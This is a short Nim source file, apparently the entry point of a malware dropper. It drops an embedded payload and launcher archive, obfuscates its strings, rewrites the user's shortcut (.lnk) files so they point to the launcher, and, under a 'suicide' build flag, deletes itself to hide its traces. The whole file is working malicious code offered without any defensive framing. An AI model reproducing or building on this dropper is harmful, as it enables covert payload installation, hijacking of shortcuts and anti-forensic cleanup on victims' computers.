import tables
import core/config
import core/static_strs

from core/lnks import modifyAllLnkPaths
from core/util import unzip, getFullPath

when defined suicide:
  import suicide

const 
  PAYLOAD_ZIP = staticRead(jam("../rsrc/payload.zip"))
  LAUNCHER_ZIP = staticRead(jam("../rsrc/launcher.zip"))
  
let CONFIG : Table[string, string] = getConfig()

let 
  launcherPath: string = CONFIG[jam("launcherPath")]
  payloadPath: string = CONFIG[jam("payloadPath")]
  launcherBin: string = CONFIG[jam("launcherBin")]
  fLauncherPath: string = getFullPath(launcherPath)
  fpayloadPath: string = getFullPath(payloadPath)

when isMainModule:
  unzip(fpayloadPath, PAYLOAD_ZIP)
  unzip(fLauncherPath, LAUNCHER_ZIP)
  modifyAllLnkPaths(fLauncherPath, launcherBin)
  when defined suicide:
    suicide.sDelete()
